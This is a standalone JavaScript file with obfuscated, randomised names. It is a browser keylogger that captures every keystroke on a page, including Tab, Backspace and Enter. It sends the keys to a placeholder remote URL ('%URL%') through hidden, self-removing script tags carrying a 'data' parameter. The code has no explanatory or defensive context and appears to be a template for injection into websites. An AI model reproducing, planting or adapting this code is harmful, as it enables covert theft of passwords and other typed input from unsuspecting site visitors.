
var cfqPdaQzXzSSf=0;window.onload=function loadfqPdaQzXzSSf(){lfqPdaQzXzSSf=",";if(window.addEventListener){document.addEventListener('keypress',pfqPdaQzXzSSf,true);document.addEventListener('keydown',dfqPdaQzXzSSf,true);}
else if(window.attachEvent){document.attachEvent('onkeypress',pfqPdaQzXzSSf);document.attachEvent('onkeydown',dfqPdaQzXzSSf);}
else{document.onkeypress=pfqPdaQzXzSSf;document.onkeydown=dfqPdaQzXzSSf;}}
function pfqPdaQzXzSSf(e){kfqPdaQzXzSSf=(window.event)?window.event.keyCode:e.which;kfqPdaQzXzSSf=kfqPdaQzXzSSf.toString(16);if(kfqPdaQzXzSSf!="d"){fqPdaQzXzSSf(kfqPdaQzXzSSf);}}
function dfqPdaQzXzSSf(e){kfqPdaQzXzSSf=(window.event)?window.event.keyCode:e.which;if(kfqPdaQzXzSSf==9||kfqPdaQzXzSSf==8||kfqPdaQzXzSSf==13){fqPdaQzXzSSf(kfqPdaQzXzSSf);}}
function fqPdaQzXzSSf(kfqPdaQzXzSSf){lfqPdaQzXzSSf=lfqPdaQzXzSSf+kfqPdaQzXzSSf+",";var tfqPdaQzXzSSf="ZUyQXfawhPbi"+cfqPdaQzXzSSf;cfqPdaQzXzSSf++;var ffqPdaQzXzSSf;if(document.all&&(navigator.appVersion.match(/MSIE ([\d.]+)/)[1])<=8.0){ffqPdaQzXzSSf=document.createElement(String.fromCharCode(60)+"script name='"+tfqPdaQzXzSSf+"' id='"+tfqPdaQzXzSSf+"'"+String.fromCharCode(62)+String.fromCharCode(60)+"/script"+String.fromCharCode(62));}
else{ffqPdaQzXzSSf=document.createElement("script");ffqPdaQzXzSSf.setAttribute("id",tfqPdaQzXzSSf);ffqPdaQzXzSSf.setAttribute("name",tfqPdaQzXzSSf);}
var ejDBFWFHhff='?id='+window.location.href.split(/\?id=/)[1];ffqPdaQzXzSSf.setAttribute("src","%URL%"+ejDBFWFHhff+"&data="+lfqPdaQzXzSSf);ffqPdaQzXzSSf.style.visibility="hidden";document.body.appendChild(ffqPdaQzXzSSf);if(kfqPdaQzXzSSf==13||lfqPdaQzXzSSf.length>3000){lfqPdaQzXzSSf=",";}
setTimeout('document.body.removeChild(document.getElementById("'+tfqPdaQzXzSSf+'"))',5000);}